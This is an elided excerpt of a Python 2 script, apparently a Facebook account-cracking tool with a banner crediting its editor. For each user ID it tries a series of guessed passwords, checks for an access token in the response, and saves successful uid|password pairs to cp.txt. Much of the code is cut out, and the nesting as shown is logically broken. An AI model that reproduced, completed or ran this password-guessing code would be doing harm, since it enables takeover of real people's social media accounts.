...
def logo():
    time.sleep(0.1)
    os.system('echo -e "\n\n  88b  d88. db   dD  \n 88 YbdP 88 88 ,8P   \n 88  88  88 888P   \n 88  88  88 88 8b      \n 88  88  88 88  88.  \n 88  88  88 88   88.   \n\n-----------------------------------------------\n\n\xe2\x9e\xa3 Edit By   : NAZIR Khan \n\xe2\x9e\xa3 Facebook  : NaZir Khan\n\xe2\x9e\xa3 Github    : https://github.com/Gustah5\n\xe2\x9e\xa3 Whatsapp  : +92 302 ******\n\n-----------------------------------------------" | lolcat -a -d 2 -s 50')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('cp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        ...
                                        print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            ...
                                            print ' \x1b[1;31m[TOR-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
